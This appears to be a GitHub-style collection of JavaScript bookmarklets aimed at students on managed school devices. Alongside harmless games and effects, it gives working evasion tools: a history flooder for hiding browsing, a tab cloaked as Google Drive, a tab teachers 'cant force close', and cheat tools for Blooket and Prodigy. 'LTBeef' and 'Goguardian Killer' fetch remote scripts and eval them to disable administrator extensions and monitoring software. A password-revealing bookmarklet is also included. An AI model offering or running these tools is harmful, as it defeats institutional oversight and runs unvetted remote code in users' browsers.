# Bookmarklet Collection
### I do not condone any illegal/immoral use of these bookmarklets, these are listed strictly for educational purposes!


> ## History Flooder
#### Have something to hide? Use this bookmarklet to spam your history with your input of websites!
`javascript:var num=prompt("History flood amount: "); done = false; x = window.location.href; for (var i=1; i<=num; i++) {history.pushState(0, 0, i==num?x:i.toString()); if(i==num){done=true}}if(done===true){alert("History flood successful! "+window.location.href+" now appears in your history "+num+(num==1?" time.":" times."))}`



> ## X-Ray Googles
#### This lets you edit the raw HTMl of a page (Client-Sided)
`javascript:(function () {var script=document.createElement('script');script.src='https://x-ray-goggles.mouse.org/webxray.js';script.className='webxray';script.setAttribute('data-lang','en-US');script.setAttribute('data-baseuri','https://x-ray-goggles.mouse.org');document.body.appendChild(script);}())`



> ## Portable Minecraft
#### Play a mock minecraft on any webpage! Recovered by luphoria.
`javascript:(function(){window.mcbmRootURI='https://luphoria.com/MCanywhere/';window.mcbmScriptURI='mcbm.min.js';window.mcbmLang='eng';var s,ss=window.mcbmRootURI+'js/mcbm-load.min.js';s=document.createElement('script');s.src=ss;document.body.appendChild(s);})();`



> ## Portable Snake Game
#### Game window appears on your page that you can play snake on.

`javascript:Q=32;m=b=Q*Q;a=[P=l=u=d=p=S=w=0];u=8;f=(h=j=t=(b+Q)/2)-1;(B=(D=document).body).appendChild(x=D.createElement("p"));(X=x.style).position="fixed";X.left=X.top=0;X.background="#FFF%22;x.innerHTML=%22%3Cp%3E%3C/p%3E%3Ccanvas%3E%22;v=(s=x.childNodes)[0];(s=s[1]).width=s.height=5*Q;c=s.getContext(%222d%22);%20onkeydown=onblur=F=function(e,g){g?a[f]?(w+=m,f=Math.random(l+=8)*(R=Q-2)*R|(u=0),F(f+=Q+1+2*(f/R|0),g)):F(f):0%3Ee?(l?--l:(y=t,t=a[t]-2,F(y)),S+=(w*=0.8)/4,m=999/(u++%20+10),a[h+=[-1,-Q,1,Q][d=p]]?B.removeChild(x,alert(%22Game%20Over!\nThe%20game%20window%20will%20now%20be%20closed.\n\nMade%20by%203kh0%22)):(F(h),F(e,j=h),v.innerHTML=P?(setTimeout(F,50,e,0),S|0):%22Press%20P%20to%20play!%20Made%20by%203kh0%22)):-e?(y=(a[e]=e%3CQ|e%3E=Q*Q-Q|!(e%Q)|e%Q==Q-1|2*(e==h))+(e==f),e==h&&(a[j]=2+h),c.fillStyle=%22hsl(%22+99*!a[e]+%22,%22+2*m+%22%,%22+50*y+%22%)%22,c.fillRect(e%Q*5,5*(e/Q|0),5,5)):isNaN(y=e.keyCode-37)|43==y?(P=y&&!P)&&F(-1):%20p=!P|y&-4|!(y^2^d)?p:y;return!1};for(;--b;F(b));void%20F(-1);`



> ## Enter The Matrix
#### Do you choose the red or the blue pill?

`javascript:(function(){var%20wn=window,w,h,o={},m,dc,b,c='ABCDEFGHIJKLM1234567890nopqrstuvwxyz',y=setInterval,z=clearInterval,t=1;function%20x(){dc=document;b=dc.body;b.innerHTML='';bs=b.style;w=wn.innerWidth;h=wn.innerHeight;bs.backgroundColor='black';bs.overflow='hidden';m=y(n,25);dc.addEventListener('keydown',function(e){if(e.keyCode==83){if(t)z(m);else%20m=y(n,25);t=!t}},0)}function%20g(i){return%20dc.getElementById(i)}function%20r(d,m){return%20Math.floor(Math.random()*d)+m}function%20a(i){var%20d=g(i),ds=d.style,t=parseInt(ds.top),k=o[i];if(t<h){ds.top=(t+10)+'px'}else{z(k);b.removeChild(d);delete%20k}}function%20n(){var%20d=dc.createElement('div'),dt=new%20Date(),i='m_'+dt.getTime(),ds=d.style,v=ds.visibility,j=0,u=[],l=r(21,4),q=c.length,p;d.id=i;ds.width='5px';ds.opacity=r(.3,.7);ds.fontSize=r(8,8)+'px';ds.lineHeight='8px';ds.color='green';ds.position='absolute';ds.left=r(w,0)+'px';v='hidden';while(j<l){p=r(q,0);u[j]=c.substring(p,p+1);j++}d.innerHTML=u.join("\n");b.appendChild(d);ds.top=-d.offsetHeight+'px';v='visible';o[i]=y(function(){a(i)},r(20,40))}x();})()`



> ## LTBeef
#### Force disable admin installed extensions (go to chrome webstore)

`javascript:fetch('https://compactcow.com/ltbeef/exploit.js').then(data=>{data.text().then(text=>{eval(text)})});`



> ## Google Drive Tab Disguise
#### Changes icon and title of tab to Google Drives

`javascript:function gcloak() { var link = document.querySelector("link[rel*='icon']") || document.createElement('link');link.type = 'image/x-icon';link.rel = 'shortcut icon';link.href = 'https://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_5.ico';document.title = 'My Drive - Google Drive';console.log(document.title);document.getElementsByTagName('head')[0].appendChild(link) };gcloak();setInterval(gcloak, 1000);`



> ## Secure Page
#### This bookmarklet makes your tab need extra confirmation to close (teachers cant force close)

`javascript:window.onbeforeunload = function() { return "Do you want to close"; }; alert("Tab Secured");`



> ## Show Password
#### Makes "********" Passwords show after clicking bookmarklet

`javascript:(function(){ var IN,F;IN=document.getElementsByTagName('input'); for(var i=0;i<IN.length;i++){F=IN[i]; if(F.type.toLowerCase()=='password'){ try{F.type='text'}catch(r){ var n,Fa;n=document.createElement('input'); Fa=F.attributes;for(var ii=0;ii<Fa.length;ii++){ var k,knn,knv;k=Fa[ii];knn=k.nodeName;knv=k.nodeValue; if(knn.toLowerCase()!='type'){ if(knn!='height'&&knn!='width'&!!knv)n[knn]=knv}}; F.parentNode.replaceChild(n,F)}}}})()`



> ## Blooket Multitool
#### This is a semi-functional blooket multitool

`Way too big to put here but its at (https://zeltux.dev/dump/blooket.js)`



> ## The Holy Fucking Grail (NOT MINE)
#### This is one of the only bookmarklets you will ever need (absolutely fucking crazy)

`javascript:(function () %7Bvar v %3D document.createElement(%27script%27)%3Bv.src %3D %27https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FBrowncha023%2FVengeance%40v1.2.0%2Fscript.min.js%27%3Bdocument.body.appendChild(v)%3B%7D())`



> ## Prodigy Multitool
#### This is a prodigy cheat multitool

`Way too big to put here but its at (https://zeltux.dev/dump/prodigy.js)`

> ## Online Notepad
#### Just opens a new tab that allows you to type whatever you desire

`javascript:(function()%7Bjavascript%3Avoid%20(()%20%3D%3E%20%7Blet%20textEditorPopup%20%3D%20window.open(%22%22%2C%20%22Text%20Editor%22%2C%20%22width%3D1000%2Cheight%3D500%22)%3B%20textEditorPopup.document.body.contentEditable%20%3D%20true%3B%20textEditorPopup.document.body.style.fontFamily%20%3D%20%22monospace%22%3B%20textEditorPopup.document.body.style.fontSize%20%3D%20%2220px%22%3B%20textEditorPopup.document.body.spellcheck%20%3D%20false%3B%20textEditorPopup.document.title%20%3D%20%22Text%20Editor%22%3B%7D)()%3B%7D)()%3B`

> ## Goguardian Killer
#### Kills GoGuardian (Duhh) (NOT MINE)

`javascript:fetch(`https://raw.githubusercontent.com/H4lyc0n/Goguardian-killer/main/Exploit_Not_The_Bookmarklet.js`).then(data=>{data.text().then(text=>{eval(text)})});`
